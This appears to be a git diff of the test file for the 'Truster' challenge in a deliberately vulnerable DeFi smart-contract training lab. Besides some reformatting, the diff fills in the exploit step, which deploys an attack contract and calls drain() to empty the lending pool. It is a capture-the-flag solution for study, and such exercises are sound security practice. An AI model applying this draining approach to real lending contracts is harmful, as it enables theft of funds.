@@ -10,14 +10,8 @@ describe('[Challenge] Truster', function () {
 		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 		;[deployer, attacker] = await ethers.getSigners()
 
-		const DamnValuableToken = await ethers.getContractFactory(
-			'DamnValuableToken',
-			deployer
-		)
-		const TrusterLenderPool = await ethers.getContractFactory(
-			'TrusterLenderPool',
-			deployer
-		)
+		const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer)
+		const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer)
 
 		this.token = await DamnValuableToken.deploy()
 		this.pool = await TrusterLenderPool.deploy(this.token.address)
@@ -29,10 +23,13 @@ describe('[Challenge] Truster', function () {
 		expect(await this.token.balanceOf(attacker.address)).to.equal('0')
 	})
 
+	/** CODE YOUR EXPLOIT HERE  */
 	it('Exploit', async function () {
-		/** CODE YOUR EXPLOIT HERE  */
+		// Deploy
 		const TrusterAttack = await ethers.getContractFactory('TrusterAttack', attacker)
 		attackContract = await TrusterAttack.deploy(this.token.address, this.pool.address)
+
+		// Drain
 		attackContract.connect(attacker).drain()
 	})
 
